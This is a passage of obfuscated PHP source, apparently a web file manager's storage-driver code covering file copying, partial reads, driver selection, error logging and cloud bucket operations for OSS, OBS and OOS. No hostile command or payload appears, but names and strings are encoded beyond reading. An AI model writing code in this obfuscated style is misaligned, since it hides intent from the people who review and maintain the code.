(isset($¤¶ãèä´[$í”‚• ¯])) { if ($ê÷¢ƒå·[$øüú×“Ó[77]] == 1) { continue; } if ($¤¶ãèä´[$í”‚• ¯][$øüú×“Ó[78]] == $ê÷¢ƒå·[$øüú×“Ó[78]]) { continue; } } if ($ê÷¢ƒå·[$øüú×“Ó[77]] == 1) { $¹§ÙäêŒ[] = $Â¾¿¬‹« . $øüú×“Ó[8] . trim($í”‚• ¯, $øüú×“Ó[8]); continue; } $äÒÍì‹ = strstr(trim($í”‚• ¯, $øüú×“Ó[8]), $øüú×“Ó[8]) ? get_path_father($í”‚• ¯) : $øüú×“Ó[12]; $˜—ªˆ«´[] = array($øüú×“Ó[1208] => $ê÷¢ƒå·[$øüú×“Ó[88]], $øüú×“Ó[1209] => rtrim($Â¾¿¬‹«, $øüú×“Ó[8]) . $øüú×“Ó[8] . $äÒÍì‹, $øüú×“Ó[1210] => $ê÷¢ƒå·); } $¸Îñç“Æ = array($øüú×“Ó[216] => $˜—ªˆ«´, $øüú×“Ó[77] => $¹§ÙäêŒ); Hook::trigger($øüú×“Ó[1211], $‡ØÉÅ÷Å, $Â¾¿¬‹«, $¸Îñç“Æ); foreach ($¹§ÙäêŒ as $ê÷¢ƒå·) { IO::mkdir($ê÷¢ƒå·); } foreach ($˜—ªˆ«´ as $ê÷¢ƒå·) { IO::copy($ê÷¢ƒå·[$øüú×“Ó[1208]], $ê÷¢ƒå·[$øüú×“Ó[1209]], REPEAT_REPLACE); } } public static function fileSubstr($Êó÷ï°, $‡‡İ…Ã±, $‰Ü›–Šì = false) { $³Î‡Æ—Ç =& $_SERVER[èùÙ¹Ïö]; $²Ôù´¹È = self::driverMake($Êó÷ï°); $ö¾ô‡¾œ = $²Ôù´¹È->size($Êó÷ï°); $«Ö¸ª”Í = $‡‡İ…Ã±; $…¬â®Ñ» = $‰Ü›–Šì; if ($‡‡İ…Ã± < 0) { $‡‡İ…Ã± = $ö¾ô‡¾œ + $‡‡İ…Ã±; } if ($‰Ü›–Šì === !1) { $‰Ü›–Šì = $ö¾ô‡¾œ - $‡‡İ…Ã±; } if ($‡‡İ…Ã± + $‰Ü›–Šì > $ö¾ô‡¾œ) { $‰Ü›–Šì = $ö¾ô‡¾œ - $‡‡İ…Ã±; } if (!$ö¾ô‡¾œ && $²Ôù´¹È->getType() == $³Î‡Æ—Ç[108] && !$²Ôù´¹È->exist($Êó÷ï°)) { $˜á””œ– = get_path_this($Êó÷ï°); $ó¬°€¡® = parse_url_query($˜á””œ–); if (is_array($ó¬°€¡®) && isset($ó¬°€¡®[$³Î‡Æ—Ç[32]])) { $˜á””œ– = urldecode($ó¬°€¡®[$³Î‡Æ—Ç[32]]); } throw new Exception($³Î‡Æ—Ç[1212] . LNG($³Î‡Æ—Ç[1213]) . $³Î‡Æ—Ç[1012] . clear_html($˜á””œ–) . $³Î‡Æ—Ç[12]); } if ($‰Ü›–Šì <= 0) { return $³Î‡Æ—Ç[12]; } if ($‡‡İ…Ã± < 0 || $‡‡İ…Ã± >= $ö¾ô‡¾œ || $‰Ü›–Šì > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\x65\141\144\40\145\162\162\x6f\x72\x21\40\163\x74\x61\x72\164\75{$‡‡İ…Ã±}\73\x6c\x65\156\147\164\150\x3d{$‰Ü›–Šì}\73\x20\x73\x69\x7a\145\x3d{$ö¾ô‡¾œ}\73"); } $¸÷®¸Â¢ = $²Ôù´¹È->fileSubstr($Êó÷ï°, $‡‡İ…Ã±, $‰Ü›–Šì); if (!$¸÷®¸Â¢ && $‰Ü›–Šì && isset($GLOBALS[$³Î‡Æ—Ç[1214]])) { throw new Exception($GLOBALS[$³Î‡Æ—Ç[1214]][$³Î‡Æ—Ç[1215]]); } return $¸÷®¸Â¢; } private static function driverMake(&$˜ï¶Âè’) { $½Õ‡ê¡ =& $_SERVER[èùÙ¹Ïö]; $€ª¸±Æ‹ = KodIO::parse($˜ï¶Âè’); if (!self::$driverListSystem) { $áƒ‘™åî = Model($½Õ‡ê¡[807])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($áƒ‘™åî, $½Õ‡ê¡[445]); } if ($€ª¸±Æ‹[$½Õ‡ê¡[33]] == KodIO::KOD_IO && !self::$driverListSystem[$€ª¸±Æ‹[$½Õ‡ê¡[445]]]) { return !1; } $˜ï¶Âè’ = $€ª¸±Æ‹[$½Õ‡ê¡[1216]]; $—Ê„µš¹ = self::driverGet($€ª¸±Æ‹, $˜ï¶Âè’); return $—Ê„µš¹; } private static function driverGet($½÷Ó¾Îø, &$“¬½±á­) { $£œ„òóó =& $_SERVER[èùÙ¹Ïö]; $˜âÅğ÷† = $½÷Ó¾Îø[$£œ„òóó[1217]]; $¤’¬¸Ó = $½÷Ó¾Îø[$£œ„òóó[445]]; switch ($½÷Ó¾Îø[$£œ„òóó[33]]) { case KodIO::KOD_IO: $’ÊŒ°º = self::$driverListSystem[$¤’¬¸Ó]; break; case KodIO::KOD_SOURCE: $“¬½±á­ = $¤’¬¸Ó . $“¬½±á­; $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1219], $£œ„òóó[6] => $½÷Ó¾Îø); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‚²¢õª = $GLOBALS[$£œ„òóó[1220]]; self::$driverListUser = array_to_keyvalue($‚²¢õª, $£œ„òóó[445]); } $’ÊŒ°º = self::$driverListUser[$¤’¬¸Ó]; break; case KodIO::KOD_SHARE_LINK: $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1221], $£œ„òóó[6] => $½÷Ó¾Îø); $ğıü = Action($£œ„òóó[1222])->sharePathInfo($½÷Ó¾Îø[$£œ„òóó[86]]); $“¬½±á­ = $ğıü[$£œ„òóó[183]]; if (!$ğıü[$£œ„òóó[183]]) { $”Ä„µòõ = Model($£œ„òóó[635])->getInfo($ğıü[$£œ„òóó[636]]); $“¬½±á­ = KodIO::clear($”Ä„µòõ[$£œ„òóó[1223]] . $½÷Ó¾Îø[$£œ„òóó[1216]]); $½÷Ó¾Îø[$£œ„òóó[531]] = $”Ä„µòõ; $½÷Ó¾Îø[$£œ„òóó[1199]] = $“¬½±á­; $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1224], $£œ„òóó[6] => $½÷Ó¾Îø); } break; case KodIO::KOD_SHARE_ITEM: $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1225], $£œ„òóó[6] => $½÷Ó¾Îø); $”Ä„µòõ = Model($£œ„òóó[635])->getInfo($½÷Ó¾Îø[$£œ„òóó[445]]); if ($”Ä„µòõ[$£œ„òóó[183]] == $£œ„òóó[214]) { $“¬½±á­ = KodIO::clear($”Ä„µòõ[$£œ„òóó[1223]] . $½÷Ó¾Îø[$£œ„òóó[1216]]); $½÷Ó¾Îø[$£œ„òóó[531]] = $”Ä„µòõ; $½÷Ó¾Îø[$£œ„òóó[1199]] = $“¬½±á­; $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1226], $£œ„òóó[6] => $½÷Ó¾Îø); } else { if (!$“¬½±á­) { $“¬½±á­ = $”Ä„µòõ[$£œ„òóó[183]]; } } break; default: $“¬½±á­ = $½÷Ó¾Îø[$£œ„òóó[86]]; $’ÊŒ°º = array($£œ„òóó[1218] => $£œ„òóó[1227]); break; } $î•èîæ = $½÷Ó¾Îø[$£œ„òóó[86]]; if (!isset(self::$driverCache[$î•èîæ])) { $ƒÈ™›¦‡ = strtolower($’ÊŒ°º[$£œ„òóó[97]]); $Á¡Æ·» = $GLOBALS[$£œ„òóó[6]][$£œ„òóó[91]][$£œ„òóó[866]]; $î™©İ­Ä = $£œ„òóó[76] . (isset($Á¡Æ·»[$ƒÈ™›¦‡]) ? $Á¡Æ·»[$ƒÈ™›¦‡] : ucfirst($ƒÈ™›¦‡)); if (!class_exists($î™©İ­Ä)) { show_json("{$î™©İ­Ä}\40\156\157\164\40\x65\x78\151\163\x74\x73\x21", !1); } $Ü•×Ø§« = isset($’ÊŒ°º[$£œ„òóó[6]]) ? $’ÊŒ°º[$£œ„òóó[6]] : !1; self::$driverCache[$î•èîæ] = new $î™©İ­Ä($Ü•×Ø§«); } $Ó­ŒŒ½ = self::$driverCache[$î•èîæ]; $Ó­ŒŒ½->pathDriver = $˜âÅğ÷†; $Ó­ŒŒ½->pathBase = $£œ„òóó[12]; if (isset($’ÊŒ°º[$£œ„òóó[6]][$£œ„òóó[1228]])) { $Ó­ŒŒ½->pathBase = rtrim($’ÊŒ°º[$£œ„òóó[6]][$£œ„òóó[1228]], $£œ„òóó[8]) . $£œ„òóó[8]; $“¬½±á­ = $Ó­ŒŒ½->pathBase . ltrim($“¬½±á­, $£œ„òóó[8]); } $“¬½±á­ = $Ó­ŒŒ½->getPath($“¬½±á­); if (isset($½÷Ó¾Îø[$£œ„òóó[1199]])) { $“¬½±á­ = $½÷Ó¾Îø[$£œ„òóó[1199]]; } $Ó­ŒŒ½->path = $“¬½±á­; return $Ó­ŒŒ½; } public static function errorTips($±ÈáÌéâ = false) { $ÙÍÚƒñğ =& $_SERVER[èùÙ¹Ïö]; static $•ôÑ¸Ğ³ = array(); $’ÔšûıÆ = 1000; if ($±ÈáÌéâ === -1) { return $•ôÑ¸Ğ³ ? $•ôÑ¸Ğ³[count($•ôÑ¸Ğ³) - 1] : $ÙÍÚƒñğ[12]; } if ($±ÈáÌéâ === !1) { return implode($ÙÍÚƒñğ[248], $•ôÑ¸Ğ³); } if (count($•ôÑ¸Ğ³) >= $’ÔšûıÆ) { $•ôÑ¸Ğ³ = array_slice($•ôÑ¸Ğ³, $’ÔšûıÆ * 0.5, $’ÔšûıÆ); } $•ôÑ¸Ğ³[] = $±ÈáÌéâ; write_log($ÙÍÚƒñğ[165] . ACTION . $ÙÍÚƒñğ[1229] . $±ÈáÌéâ, $ÙÍÚƒñğ[1230]); } public static function getLastError($£µ£Õ®¢ = '') { $²ï‡ùé’ = self::errorTips(-1); return $²ï‡ùé’ ? $²ï‡ùé’ : $£µ£Õ®¢; } } $_file = $_SERVER[$_SERVER[èùÙ¹Ïö][1192]]; $_size = $_SERVER[èùÙ¹Ïö][919]; goto FÀŸ¦…Ğ¯ç; Eê¶¢ˆÑ³: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($€¶„Ÿ) { parent::__construct($€¶„Ÿ); $this->signatureVersion($_SERVER[èùÙ¹Ïö][233]); } public function fileOutImage($™şÚå¬¿, $È½Š³¨Œ = 250) { $Îä»ÃŞš =& $_SERVER[èùÙ¹Ïö]; if ($this->size($™şÚå¬¿) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™şÚå¬¿, $È½Š³¨Œ); } $Â¦¾Ö± = array($Îä»ÃŞš[1416] => $Îä»ÃŞš[1417] . $È½Š³¨Œ . $Îä»ÃŞš[1418]); $ô˜Ùé—• = $this->link($™şÚå¬¿, $Â¦¾Ö±); $this->fileOutLink($ô˜Ùé—•); } public function fileOutLink($ëÃ¶„‰ª) { $È›ïºŞÀ =& $_SERVER[èùÙ¹Ïö]; if (substr($ëÃ¶„‰ª, 0, 7) == $È›ïºŞÀ[1379]) { $ëÃ¶„‰ª = $È›ïºŞÀ[1380] . substr($ëÃ¶„‰ª, 7); } header($È›ïºŞÀ[164] . $ëÃ¶„‰ª); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($§Êí¢û—) { parent::__construct($§Êí¢û—); $this->signatureVersion($_SERVER[èùÙ¹Ïö][233]); } public function fileOutLink($Ë’îšù’) { $ËìÂ—Äõ =& $_SERVER[èùÙ¹Ïö]; if (substr($Ë’îšù’, 0, 7) == $ËìÂ—Äõ[1379]) { $Ë’îšù’ = $ËìÂ—Äõ[1380] . substr($Ë’îšù’, 7); } header($ËìÂ—Äõ[164] . $Ë’îšù’); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ìËÄŠ¡ò) { parent::__construct(); include_once SDK_DIR . $_SERVER[èùÙ¹Ïö][1419]; $this->_init($ìËÄŠ¡ò); } public function _init($¥¯çŸÌò) { $İ½Õ¡ğ¢ =& $_SERVER[èùÙ¹Ïö]; $this->config = $¥¯çŸÌò; foreach ($¥¯çŸÌò as $›ì‹»šµ => $›³ÖíñÃ) { if (isset($this->{$›ì‹»šµ})) { $this->{$›ì‹»šµ} = $›³ÖíñÃ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($İ½Õ¡ğ¢[1420] . LNG($İ½Õ¡ğ¢[1421])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ñÉƒ‰Áô =& $_SERVER[èùÙ¹Ïö]; $‡ÁÃ ı = new OSS\Model\CorsConfig(); $¾‡«—½ = new OSS\Model\CorsRule(); $¾‡«—½->addAllowedOrigin($ñÉƒ‰Áô[1422]); $¾‡«—½->addAllowedMethod($ñÉƒ‰Áô[1423]); $¾‡«—½->addAllowedMethod($ñÉƒ‰Áô[1424]); $¾‡«—½->addAllowedMethod($ñÉƒ‰Áô[1425]); $¾‡«—½->addAllowedMethod($ñÉƒ‰Áô[1426]); $¾‡«—½->addAllowedMethod($ñÉƒ‰Áô[163]); $¾‡«—½->setMaxAgeSeconds(600); $¾‡«—½->addExposeHeader($ñÉƒ‰Áô[1427]); $¾‡«—½->addAllowedHeader($ñÉƒ‰Áô[1422]); $‡ÁÃ ı->addRule($¾‡«—½); try { $this->client->putBucketCors($this->bucket, $‡ÁÃ ı); } catch (OSS\Core\OssException $ÍšÀ€½‰) { return !1; } return !0; } public function getBucketCors() { $ââğùË =& $_SERVER[èùÙ¹Ïö]; $´Õ¯é¡ù = null; try { $´Õ¯é¡ù = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ïø˜Ÿµ¤) { return null; } if (!$´Õ¯é¡ù || !($Å× úàŞ = $´Õ¯é¡ù->getRules())) { return null; } $óÉ¾ÕŞá = $Å× úàŞ[0]->getAllowedOrigins(); $ˆË¦÷™ = $Å× úàŞ[0]->getAllowedMethods(); $ñ×ÀüÓÉ = $Å× úàŞ[0]->getMaxAgeSeconds(); $ğ±µÃºŒ = $Å× úàŞ[0]->getExposeHeaders(); $¸–û÷¿¿ = $Å× úàŞ[0]->getAllowedHeaders(); return array($ââğùË[204] => isset($óÉ¾ÕŞá[0]) ? $óÉ¾ÕŞá[0] : $ââğùË[12], $ââğùË[208] => $ˆË¦÷™, $ââğùË[1428] => $ñ×ÀüÓÉ, $ââğùË[1429] => isset($ğ±µÃºŒ[0]) ? $ğ±µÃºŒ[0] : $ââğùË[12], $ââğùË[206] => isset($¸–û÷¿¿[0]) ? $¸–û÷¿¿[0] : $ââğùË[12]); } public function isBucketCors() { $–ê÷–à =& $_SERVER[èùÙ¹Ïö]; $Ç¨ ¨µï = $this->getBucketCors(); if (!$Ç¨ ¨µï || !is_array($Ç¨ ¨µï)) { return !1; } if ($Ç¨ ¨µï[$–ê÷–à[204]] != $–ê÷–à[205] || $Ç¨ ¨µï[$–ê÷–à[206]] != $–ê÷–à[205]) { return !1; } $ŸÚ„Áö² = array_map($–ê÷–à[207], $Ç¨ ¨µï[$–ê÷–à[208]]); if (!is_array($ŸÚ„Áö²)) { $ŸÚ„Áö² = array(); } $¢°„ˆØ€ = array($–ê÷–à[209], $–ê÷–à[210], $–ê÷–à[211], $–ê÷–à[212], $–ê÷–à[213]); $§ÑÆĞ› = array_diff($¢°„ˆØ€, $ŸÚ„Áö²); return empty($§ÑÆĞ›); } public function mkfile($’ãŸ©Ñ³, $ÒÏ—Ûï = '', $ğ‡ÂÑ£â = REPEAT_RENAME) { $ø¶šºå† = $this->setContent($’ãŸ©Ñ³, $ÒÏ—Ûï); if ($ø¶šºå† !== !1) { return $this->getPathOuter($’ãŸ©Ñ³); } return !1; } public function mkdir($ã‘½¯¸, $™ûä‚— = REPEAT_SKIP) { if ($™ûä‚— && $this->_isFolder($ã‘½¯¸)) { return $this->getPathOuter($ã‘½¯¸); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ã‘½¯¸)); } catch (OSS\Core\OssException $Â‘ş€»õ) { return !1; } return $this->getPathOuter($ã‘½¯¸); } private function fileList($âÌÊÑ×î, $†…¼áãÔ = '', $Œ‰Á£óà = 0) { $òŸİ§ƒ =& $_SERVER[èùÙ¹Ïö]; $âÌÊÑ×î = trim($âÌÊÑ×î, $òŸİ§ƒ[8]); $Âø¦¿•… = empty($âÌÊÑ×î) && $âÌÊÑ×î !== $òŸİ§ƒ[214] ? $òŸİ§ƒ[12] : $âÌÊÑ×î . $òŸİ§ƒ[8]; $æ·Ç‚˜ï = $òŸİ§ƒ[12]; $™îêŒëç = 1000; $Òù×«ä° = $ÛßÚÈÑ‘ = array(); while (!0) { check_abort(); $ßõ•Æ× = array($òŸİ§ƒ[1430] => $†…¼áãÔ, $òŸİ§ƒ[1431] => $Âø¦¿•…, $òŸİ§ƒ[1432] => $™îêŒëç, $òŸİ§ƒ[1433] => $æ·Ç‚˜ï); try { $“Ç¢ôšÒ = $this->client->listObjects($this->bucket, $ßõ•Æ×); } catch (OSS\Core\OssException $ÉÓ¤­ÊÉ) { break; } $æ·Ç‚˜ï = $“Ç¢ôšÒ->getNextMarker(); $¹’©ÑÃ´ = $“Ç¢ôšÒ->getObjectList(); $Ø¥İö¥Ã = $“Ç¢ôšÒ->getPrefixList(); foreach ($¹’©ÑÃ´ as $¹‡‹Ş«) { if ($¹‡‹Ş«->getKey() == $Âø¦¿•…) { continue; } $Æ»Ã•Â¿ = $¹‡‹Ş«->getKey(); $…ƒ™²ûÌ = $¹‡‹Ş«->getSize(); $Î¿‰éØ¤ = $¹‡‹Ş«->getLastModified(); $Ö½¬ùº = trim($¹‡‹Ş«->getETag(), $òŸİ§ƒ[120]); $»×ìˆÎÌ = $Œ‰Á£óà ? array($òŸİ§ƒ[32] => $Æ»Ã•Â¿, $òŸİ§ƒ[78] => $…ƒ™²ûÌ, $òŸİ§ƒ[196] => strtotime($Î¿‰éØ¤), $òŸİ§ƒ[1434] => $Ö½¬ùº) : $Æ»Ã•Â¿; $ÊÔÈĞº¼ = $…ƒ™²ûÌ == 0 && substr($Æ»Ã•Â¿, strlen($Æ»Ã•Â¿) - 1, 1) == $òŸİ§ƒ[8] ? !0 : !1; $Ôšó é– = array($òŸİ§ƒ[78] => $…ƒ™²ûÌ, $òŸİ§ƒ[1435] => $…ƒ™²ûÌ, $òŸİ§ƒ[87] => strtotime($Î¿‰éØ¤), $òŸİ§ƒ[1436] => $Î¿‰éØ¤, $òŸİ§ƒ[1434] => $Ö½¬ùº); $this->cacheMethodInfoSet($Æ»Ã•Â¿, $ÊÔÈĞº¼, $Ôšó é–); if ($ÊÔÈĞº¼) { $Òù×«ä°[] = $Æ»Ã•Â¿; continue; } $ÛßÚÈÑ‘[] = $»×ìˆÎÌ; } foreach ($Ø¥İö¥Ã as $ØÔõŒ¸) { $Òù×«ä°[] = $ØÔõŒ¸->getPrefix(); $this->cacheMethodInfoSet($ØÔõŒ¸->getPrefix(), !0); } if ($æ·Ç‚˜ï === $òŸİ§ƒ[12]) { break; } } $this->cacheMethodInfoSet($âÌÊÑ×î, !0); return array($òŸİ§ƒ[84] => $Òù×«ä°, $òŸİ§ƒ[85] => $ÛßÚÈÑ‘); } public function copyFile($‹²îˆ‘·, $ø­¤ößí) { $ø™ÔşÊ = $this->size($‹²îˆ‘·); if ($ø™ÔşÊ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‹²îˆ‘·, $this->bucket, $this->pathEncode($ø­¤ößí)); } catch (OSS\Core\OssException $ÄƒÑ³áÎ) { return !1; } return $this->getPathOuter($ø­¤ößí); } $Ğ€ÄØÛå = $this->multiCopyObject($‹²îˆ‘·, $ø­¤ößí, $ø™ÔşÊ); return $Ğ€ÄØÛå ? $this->getPathOuter($ø­¤ößí) : !1; } private function multiCopyObject($àæ±–•ô, $±è„Šœ³, $½‡Åû°) { $±¶õ² =& $_SERVER[èùÙ¹Ïö]; try { $ŒÌïÌø¥ = array(); if ($×˜—‰ = $this->hashMd5($àæ±–•ô)) { $ŒÌïÌø¥ = array(OSS\OssClient::OSS_HEADERS => array($±¶õ²[1437] => $×˜—‰)); } $Ğ½É¶ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($±è„Šœ³), $ŒÌïÌø¥); $­¶‘¡çæ = 1; $ƒÓ“Ï = 0; $şËŠş€œ = array(); $·õÆ’õÈ = 1024 * 1024 * 10; $¬ˆâÔ­® = $this->client->generateMultiuploadParts($½‡Åû°, $·õÆ’õÈ); foreach ($¬ˆâÔ­® as $ñ¾ôÎ÷ => $˜Ç¹™™ş) { $˜„ç¼ñî = $ƒÓ“Ï + (int) $˜Ç¹™™ş[$±¶õ²[1438]]; $ÙÌÃŞûº = (int) $˜Ç¹™™ş[$±¶õ²[383]] + $˜„ç¼ñî - 1; $²ÂÑšİ´ = array($±¶õ²[1439] => $˜„ç¼ñî, $±¶õ²[1440] => $ÙÌÃŞûº); $şËŠş€œ[] = $this->client->uploadPartCopy($this->bucket, $àæ±–•ô, $this->bucket, $this->pathEncode($±è„Šœ³), $­¶‘¡çæ, $Ğ½É¶, $²ÂÑšİ´); $­¶‘¡çæ = $­¶‘¡çæ + 1; } $Ó®‰èâ— = array(); foreach ($şËŠş€œ as $ñ¾ôÎ÷ => $ºö»°¬) { $Ó®‰èâ—[] = array($±¶õ²[1441] => $ñ¾ôÎ÷ + 1, $±¶õ²[1442] => $ºö»°¬); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($±è„Šœ³), $Ğ½É¶, $Ó®‰èâ—); } catch (OSS\Core\OssException $“Ç¼öÔ—) { return !1; } return !0; } public function moveFile($Í¬Ş®Ò±, $«—Á“áá) { if ($this->copyFile($Í¬Ş®Ò±, $«—Á“áá)) { $this->remove($Í¬Ş®Ò±); return $this->getPathOuter($«—Á“áá); } return !1; } public function delFile($”¡•Ê¤) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($”¡•Ê¤)); } catch (OSS\Core\OssException $÷±ô÷Ñ†) { return !1; } return !0; } public function delFolder($§ï°û¬‡) { $¶¨²ê–à =& $_SERVER[èùÙ¹Ïö]; if (!$this->exist($§ï°û¬‡)) { return !0; } $this->listItemCache = !1; $²Ôƒ€àÅ = $this->fileList($§ï°û¬‡); $this->listItemCache = !0; $é¬‹á = trim($§ï°û¬‡, $¶¨²ê–à[8]) . $¶¨²ê–à[8]; if (!empty($§ï°û¬‡) && $§ï°û¬‡ !== $¶¨²ê–à[214] && !in_array($é¬‹á, $²Ôƒ€àÅ[$¶¨²ê–à[84]])) { $²Ôƒ€àÅ[$¶¨²ê–à[84]][] = $é¬‹á; } $‘Àô”íë = $this->delByBatch($²Ôƒ€àÅ[$¶¨²ê–à[85]]); if (!$‘Àô”íë) { return !1; } $‘Àô”íë = $this->delByBatch($²Ôƒ€àÅ[$¶¨²ê–à[84]]); if (!$‘Àô”íë) { return !1; } return $this->delFile($é¬‹á); } private function delByBatch($µ²ä°â) { foreach (array_chunk($µ²ä°â, 1000) as $ğá¡î‚›) { try { $this->client->deleteObjects($this->bucket, $ğá¡î‚›); } catch (OSS\Core\OssException $öŠ¾íŞí) { return !1; } } return !0; } public function rename($İ¦œÌÌö, $õü˜»¨™) { return $this->renameObject($İ¦œÌÌö, $õü˜»¨™); } private function fileInfo($¤ú³—ë÷, $İôı˜Ö“ = false, $–„¾†ï± = array()) { $õÌœÍ§· =& $_SERVER[èùÙ¹Ïö]; $ú×³ñÔ = array($õÌœÍ§·[32] => $this->pathThis($¤ú³—ë÷), $õÌœÍ§·[86] => $this->getPathOuter($¤ú³—ë÷), $õÌœÍ§·[33] => $õÌœÍ§·[216], $õÌœÍ§·[78] => isset($–„¾†ï±[$õÌœÍ§·[78]]) ? $–„¾†ï±[$õÌœÍ§·[78]] : 0, $õÌœÍ§·[177] => $this->ext($¤ú³—ë÷)); if ($İôı˜Ö“) { return $ú×³ñÔ; } $ú×³ñÔ[$õÌœÍ§·[217]] = $ú×³ñÔ[$õÌœÍ§·[87]] = 0; $ú×³ñÔ[$õÌœÍ§·[218]] = $ú×³ñÔ[$õÌœÍ§·[219]] = !0; if (empty($–„¾†ï±)) { $—èÔÂäï = $this->objectMeta($¤ú³—ë÷); if (!$—èÔÂäï) { return $ú×³ñÔ; } $–„¾†ï± = array($õÌœÍ§·[87] => strtotime($—èÔÂäï[$õÌœÍ§·[1436]]), $õÌœÍ§·[78] => $—èÔÂäï[$õÌœÍ§·[1435]] + 0, $õÌœÍ§·[1434] => $—èÔÂäï[$õÌœÍ§·[1434]]); } if (isset($–„¾†ï±[$õÌœÍ§·[1434]]) && $–„¾†ï±[$õÌœÍ§·[1434]]) { $ú×³ñÔ[$õÌœÍ§·[221]] = trim($–„¾†ï±[$õÌœÍ§·[1434]], $õÌœÍ§·[120]); } if (isset($–„¾†ï±[$õÌœÍ§·[78]])) { $ú×³ñÔ[$õÌœÍ§·[78]] = $–„¾†ï±[$õÌœÍ§·[78]]; } if (isset($–„¾†ï±[$õÌœÍ§·[87]])) { $ú×³ñÔ[$õÌœÍ§·[87]] = $–„¾†ï±[$õÌœÍ§·[87]]; } if (isset($–„¾†ï±[$õÌœÍ§·[196]]) && !trim($ú×³ñÔ[$õÌœÍ§·[87]])) { $ú×³ñÔ[$õÌœÍ§·[87]] = $–„¾†ï±[$õÌœÍ§·[196]]; } return $ú×³ñÔ; } private function folderInfo($€€ñ€š¡, $¿—Ø±ë¯ = false, $ª¬¶õÛ– = array()) { $ášßñÍŒ =& $_SERVER[èùÙ¹Ïö]; $Ò£â¾â = array($ášßñÍŒ[32] => $this->pathThis($€€ñ€š¡), $ášßñÍŒ[86] => $this->getPathOuter($ášßñÍŒ[8] . $€€ñ€š¡), $ášßñÍŒ[33] => $ášßñÍŒ[77]); if ($¿—Ø±ë¯) { return $Ò£â¾â; } $Ò£â¾â[$ášßñÍŒ[217]] = $Ò£â¾â[$ášßñÍŒ[87]] = 0; $Ò£â¾â[$ášßñÍŒ[218]] = $Ò£â¾â[$ášßñÍŒ[219]] = !0; if (empty($ª¬¶õÛ–)) { $€€ñ€š¡ = rtrim($€€ñ€š¡, $ášßñÍŒ[8]) . $ášßñÍŒ[8]; $×éˆ¡š = $this->objectMeta($€€ñ€š¡); if (!$×éˆ¡š) { return $Ò£â¾â; } $ª¬¶õÛ– = array($ášßñÍŒ[217] => $×éˆ¡š[$ášßñÍŒ[547]][$ášßñÍŒ[1443]], $ášßñÍŒ[87] => strtotime($×éˆ¡š[$ášßñÍŒ[1436]])); } if (isset($ª¬¶õÛ–[$ášßñÍŒ[87]])) { $Ò£â¾â[$ášßñÍŒ[87]] = $ª¬¶õÛ–[$ášßñÍŒ[87]]; } if (isset($ª¬¶õÛ–[$ášßñÍŒ[217]])) { $Ò£â¾â[$ášßñÍŒ[217]] = $ª¬¶õÛ–[$ášßñÍŒ[217]]; } return $Ò£â¾â; } public function listPath($ş•ñÑÙÓ, $ò‘ıĞÕ = false) { $åá€ó†¨ =& $_SERVER[èùÙ¹Ïö]; $ŸÌ¯Ñó› = $this->fileList($ş•ñÑÙÓ, $åá€ó†¨[8], !0); foreach ($ŸÌ¯Ñó›[$åá€ó†¨[84]] as $ƒ‘˜ÙÎñ => $ÒåÖâ©†) { $ŸÌ¯Ñó›[$åá€ó†¨[84]][$ƒ‘˜ÙÎñ] = $this->folderInfo($ÒåÖâ©†, $ò‘ıĞÕ, $ÒåÖâ©†); } foreach ($ŸÌ¯Ñó›[$åá€ó†¨[85]] as $ƒ‘˜ÙÎñ => $ÒåÖâ©†) { $ŸÌ¯Ñó›[$åá€ó†¨[85]][$ƒ‘˜ÙÎñ] = $this->fileInfo($ÒåÖâ©†[$åá€ó†¨[32]], $ò‘ıĞÕ, $ÒåÖâ©†); } return $ŸÌ¯Ñó›; } protected function infoChildren($Ô›Ê¾·, &$£ğİ”»Ò) { $¬š™éŒø =& $_SERVER[èùÙ¹Ïö]; $ùááÖåº = $this->fileList($Ô›Ê¾·, $¬š™éŒø[12], !0); $£ğİ”»Ò[$¬š™éŒø[80]] += count($ùááÖåº[$¬š™éŒø[84]]); $£ğİ”»Ò[$¬š™éŒø[79]] += count($ùááÖåº[$¬š™éŒø[85]]); foreach ($ùááÖåº[$¬š™éŒø[85]] as $ûÈïğıŸ) { if (!$ûÈïğıŸ || !$ûÈïğıŸ[$¬š™éŒø[78]]) { continue; } $£ğİ”»Ò[$¬š™éŒø[78]] += $ûÈïğıŸ[$¬š™éŒø[78]]; } } public function has($ª¼Šœ¥š, $¿±§Ì‹ó = false, $¥¢Ò¢²˜ = true) { $°¼¢Æ¹¸ =& $_SERVER[èùÙ¹Ïö]; $ª¼Šœ¥š = trim($ª¼Šœ¥š, $°¼¢Æ¹¸[8]); $á¾¶óİ´ = empty($ª¼Šœ¥š) && $ª¼Šœ¥š !== $°¼¢Æ¹¸[214] ? $°¼¢Æ¹¸[12] : $ª¼Šœ¥š . $°¼¢Æ¹¸[8]; $‡Îû‰é = $°¼¢Æ¹¸[12]; $¾¦÷¼œ· = 500; $•ê÷½¼‰ = $ûïöÚ = 0; while (!0) { check_abort(); $ïÌ°ğí› = array($°¼¢Æ¹¸[1430] => $°¼¢Æ¹¸[8], $°¼¢Æ¹¸[1431] => $á¾¶óİ´, $°¼¢Æ¹¸[1432] => $¾¦÷¼œ·, $°¼¢Æ¹¸[1433] => 